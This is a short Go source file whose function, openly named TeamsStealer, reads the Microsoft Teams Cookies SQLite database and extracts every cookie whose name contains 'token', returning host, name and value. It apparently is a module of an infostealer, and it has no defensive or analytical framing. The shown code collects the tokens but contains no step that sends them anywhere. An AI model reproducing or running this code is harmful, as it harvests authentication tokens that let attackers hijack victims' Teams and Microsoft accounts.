package core

import (
	"database/sql"

	_ "modernc.org/sqlite"
)

type TeamsTokens struct {
	HostKey string `json:"hostkey"`
	Name    string `json:"name"`
	Value   string `json:"value"`
}

func teamsCookie(cookieFile string) []TeamsTokens {
	var teamsTokens []TeamsTokens
	tokenDB, err := sql.Open("sqlite", cookieFile)
	if err != nil {
		return nil
	}
	results, err := tokenDB.Query("SELECT name, value, host_key FROM Cookies WHERE name LIKE \"%token%\"")
	if err != nil {
		return nil
	}
	defer tokenDB.Close()
	var name, value, hostkey string
	for results.Next() {
		results.Scan(&name, &value, &hostkey)
		teamsTokens = append(teamsTokens, TeamsTokens{
			HostKey: hostkey,
			Name:    name,
			Value:   value,
		})
	}
	return teamsTokens
}

func TeamsStealer(TeamsFolder string) []TeamsTokens {
	teamsCookiesFile := TeamsFolder + "\\Cookies"
	cookieJSON := teamsCookie(teamsCookiesFile)
	return cookieJSON
}
